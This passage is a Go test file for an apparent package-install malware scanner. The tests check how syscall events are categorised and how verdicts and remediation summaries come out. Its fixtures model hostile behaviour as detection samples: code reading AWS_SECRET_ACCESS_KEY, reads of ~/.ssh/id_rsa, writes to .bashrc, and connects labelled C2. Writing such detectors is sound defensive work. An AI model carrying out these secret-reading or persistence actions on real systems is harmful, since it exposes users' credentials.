		{Syscall: types.EventOpenat, FilePath: "/install/node_modules/.package-lock.json", OpenFlags: "O_WRONLY|O_CREAT"},
		{Syscall: types.EventOpenat, FilePath: "/install/node_modules/.bin/node-gyp-build", OpenFlags: "O_WRONLY|O_CREAT"},
		{Syscall: types.EventOpenat, FilePath: "/install/node_modules/.cache/foo", OpenFlags: "O_WRONLY|O_CREAT"},
	}
	verdict, _ := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for npm bookkeeping writes, got %s", verdict)
	}
}

// TestAnalyze_LibraryHijackDisabledWithoutSetScanPkgs documents that
// the rule is inert when SetScanPkgs has not been called. This
// preserves the behavior of existing call sites and tests that
// predate the rule.
func TestAnalyze_LibraryHijackDisabledWithoutSetScanPkgs(t *testing.T) {
	orig := scannedPkgs
	defer func() { scannedPkgs = orig }()
	SetScanPkgs(nil)

	events := []types.SyscallEvent{
		{
			Syscall:   types.EventOpenat,
			FilePath:  "/install/node_modules/lodash/index.js",
			OpenFlags: "O_WRONLY|O_TRUNC",
		},
	}
	_, filtered := Analyze(events)
	for _, e := range filtered {
		if e.Category == types.CategoryLibraryHijack {
			t.Errorf("rule must be inert when scannedPkgs is empty, got %+v", e)
		}
	}
}

func TestAnalyze_DynamicExecNotFiltered(t *testing.T) {
	// dynamic_code_execution is LOW severity (legitimate compat libs
	// like six exec their own internal source). Even a thousand of
	// these alone don't raise the verdict, but they MUST still flow
	// through to `filtered` so the report retains forensic context.
	events := []types.SyscallEvent{
		{
			Timestamp:   time.Now(),
			Syscall:     types.EventDynamicExec,
			AuditEvent:  "Function",
			CodeSnippet: "return process.env.AWS_SECRET_ACCESS_KEY",
		},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("verdict = %q, want clean (LOW severity alone)", verdict)
	}
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event in report, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryDynamicExec {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDynamicExec)
	}
}

// decideVerdict boundary tests — these encode the rule contract so a
// future weight change can't silently relax the threshold.
func TestDecideVerdict_RuleBoundaries(t *testing.T) {
	cases := []struct {
		name   string
		events []types.SyscallEvent
		want   string
	}{
		{
			name:   "empty",
			events: nil,
			want:   types.VerdictClean,
		},
		{
			name: "single HIGH",
			events: []types.SyscallEvent{
				{Category: types.CategoryCredentialAccess},
			},
			want: types.VerdictSuspicious,
		},
		{
			name: "single MEDIUM",
			events: []types.SyscallEvent{
				{Category: types.CategoryDNSTunnel},
			},
			want: types.VerdictClean,
		},
		{
			name: "two MEDIUM",
			events: []types.SyscallEvent{
				{Category: types.CategoryDNSTunnel},
				{Category: types.CategoryEvasion},
			},
			want: types.VerdictSuspicious,
		},
		{
			name: "many LOW only",
			events: func() []types.SyscallEvent {
				out := make([]types.SyscallEvent, 100)
				for i := range out {
					out[i].Category = types.CategoryDynamicExec
				}
				return out
			}(),
			want: types.VerdictClean,
		},
		{
			name: "LOW plus HIGH",
			events: []types.SyscallEvent{
				{Category: types.CategoryDynamicExec},
				{Category: types.CategoryC2},
			},
			want: types.VerdictSuspicious,
		},
		{
			name: "unmapped category fails closed",
			events: []types.SyscallEvent{
				{Category: "category_we_havent_weighted_yet"},
			},
			want: types.VerdictSuspicious,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := decideVerdict(tc.events)
			if got != tc.want {
				t.Errorf("decideVerdict = %q, want %q", got, tc.want)
			}
		})
	}
}

func TestBuildBreakdown_OrderAndContent(t *testing.T) {
	events := []types.SyscallEvent{
		{Category: types.CategoryC2},
		{Category: types.CategoryC2},
		{Category: types.CategoryMemExec},
		{Category: types.CategoryMemExec},
		{Category: types.CategoryMemExec},
		{Category: types.CategoryEvasion},
		{Category: ""}, // ignored
	}
	got := buildBreakdown(events)

	if len(got) != 3 {
		t.Fatalf("expected 3 categories, got %d: %+v", len(got), got)
	}

	// Sorted by count desc, then alphabetical: memory_execution(3) > c2_communication(2) > evasion(1).
	if got[0].Category != types.CategoryMemExec || got[0].Count != 3 {
		t.Errorf("first hit = %+v, want memory_execution=3", got[0])
	}
	if got[1].Category != types.CategoryC2 || got[1].Count != 2 {
		t.Errorf("second hit = %+v, want c2_communication=2", got[1])
	}
	if got[2].Category != types.CategoryEvasion || got[2].Count != 1 {
		t.Errorf("third hit = %+v, want evasion=1", got[2])
	}

	// Each hit should carry a non-empty short description for the CLI.
	for _, h := range got {
		if h.Description == "" {
			t.Errorf("category %s missing short description", h.Category)
		}
	}
}

func TestBuildBreakdown_TieBreakerAlphabetical(t *testing.T) {
	events := []types.SyscallEvent{
		{Category: types.CategoryEvasion},
		{Category: types.CategoryC2},
	}
	got := buildBreakdown(events)
	if len(got) != 2 {
		t.Fatalf("expected 2 categories, got %d", len(got))
	}
	// Equal counts (1 each) — tie broken alphabetically: c2 < evasion.
	if got[0].Category != types.CategoryC2 {
		t.Errorf("first should be c2_communication on alphabetical tie, got %s", got[0].Category)
	}
}

func TestBuildBreakdown_NoEvents(t *testing.T) {
	if got := buildBreakdown(nil); got != nil {
		t.Errorf("nil events should produce nil breakdown, got %+v", got)
	}
	if got := buildBreakdown([]types.SyscallEvent{{Category: ""}}); got != nil {
		t.Errorf("category-less events should produce nil breakdown, got %+v", got)
	}
}

func TestCategoryShortDesc(t *testing.T) {
	// Every Category constant in types.go should have a short desc.
	cats := []string{
		types.CategoryC2, types.CategoryDataExfil, types.CategoryCredentialAccess,
		types.CategoryCodeExecution, types.CategoryBinaryHijack, types.CategoryBackdoor,
		types.CategoryPersistence, types.CategoryDNSTunnel, types.CategoryEvasion,
		types.CategoryMemExec, types.CategoryAntiForensics, types.CategoryDynamicExec,
	}
	for _, c := range cats {
		if got := categoryShortDesc(c); got == "" || got == c {
			t.Errorf("category %s lacks a distinct short description (got %q)", c, got)
		}
	}
}

func TestGenerateSummary_PopulatesBreakdown(t *testing.T) {
	events := []types.SyscallEvent{
		{Category: types.CategoryC2, Comm: "evil", DstAddr: "1.1.1.1", DstPort: 443, Syscall: types.EventConnect},
		{Category: types.CategoryC2, Comm: "evil", DstAddr: "1.1.1.1", DstPort: 443, Syscall: types.EventConnect},
		{Category: types.CategoryMemExec, Syscall: types.EventMmap},
	}
	summary := GenerateSummary(types.VerdictSuspicious, events)
	if summary == nil {
		t.Fatal("GenerateSummary returned nil")
	}
	if len(summary.Breakdown) != 2 {
		t.Errorf("breakdown length = %d, want 2", len(summary.Breakdown))
	}
	// Breakdown should NOT replace Description — both must be present
	// for back-compat with JSON consumers.
	if summary.Description == "" {
		t.Error("Description must remain populated for back-compat")
	}
}

// TestGenerateSummary_RemediationPriority verifies that when multiple
// remediation tiers apply, the highest-severity message always wins —
// regardless of map iteration order. The previous implementation walked
// the categories slice and returned on first match, so the message text
// flipped between runs.
func TestGenerateSummary_RemediationPriority(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "203.0.113.50", DstPort: 443, Category: types.CategoryC2},
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", Category: types.CategoryCredentialAccess},
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.bashrc", Category: types.CategoryPersistence},
	}
	const want = "audit the host for compromised credentials"

	// Repeat to amortize Go's map iteration randomness — a single call
	// could pass even when the priority logic is broken.
	for i := range 50 {
		s := GenerateSummary(types.VerdictSuspicious, events)
		if !strings.Contains(s.Remediation, want) {
			t.Fatalf("iteration %d: expected high-severity remediation containing %q, got %q",
				i, want, s.Remediation)
		}
	}
}

// TestGenerateSummary_DeterministicOrder verifies that Categories,
// Description, and Remediation are stable across repeated calls with
// identical input. Without the sort step in GenerateSummary, map
// iteration order would scramble Categories and the joined Description
// text run-to-run, polluting JSON diffs and demo recordings.
func TestGenerateSummary_DeterministicOrder(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.bashrc", Category: types.CategoryPersistence},
		{Syscall: types.EventConnect, DstAddr: "203.0.113.50", DstPort: 443, Category: types.CategoryC2},
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", Category: types.CategoryCredentialAccess},
	}

	wantCats := []string{
		types.CategoryC2,
		types.CategoryCredentialAccess,
		types.CategoryPersistence,
	}
	sort.Strings(wantCats)

	first := GenerateSummary(types.VerdictSuspicious, events)
	if !reflect.DeepEqual(first.Categories, wantCats) {
		t.Errorf("Categories = %v, want sorted %v", first.Categories, wantCats)
	}

	for i := range 50 {
		s := GenerateSummary(types.VerdictSuspicious, events)
		if !reflect.DeepEqual(s.Categories, first.Categories) {
			t.Fatalf("iteration %d: Categories changed from %v to %v",
				i, first.Categories, s.Categories)
		}
		if s.Description != first.Description {
			t.Fatalf("iteration %d: Description changed from %q to %q",
				i, first.Description, s.Description)
		}
		if s.Remediation != first.Remediation {
			t.Fatalf("iteration %d: Remediation changed from %q to %q",
				i, first.Remediation, s.Remediation)
		}
	}
}
